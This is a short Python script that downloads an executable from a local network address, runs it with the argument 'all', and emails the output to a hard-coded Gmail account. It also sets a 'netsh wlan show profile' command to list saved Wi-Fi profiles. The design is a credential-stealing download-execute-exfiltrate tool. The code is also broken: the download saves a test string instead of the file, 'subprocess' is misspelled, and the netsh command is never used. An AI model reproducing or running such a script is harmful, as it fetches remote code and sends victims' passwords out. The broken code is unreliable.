#!/usr/bin/env python
import requests, subprocess, smtplib

def download(url):
    get_requests = requests.get(url)
    file_name = url.split("/") [-1]
    with open(file_name, "wb") as out_file:
        out_file.write("this is a test")

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

download("http://192.168.8.159/example.exe")
command = "netsh wlan show profile"
result = subrocess.check_output("example.exe all", shell=True)
send_mail("youremail@mail.com", "password", result)
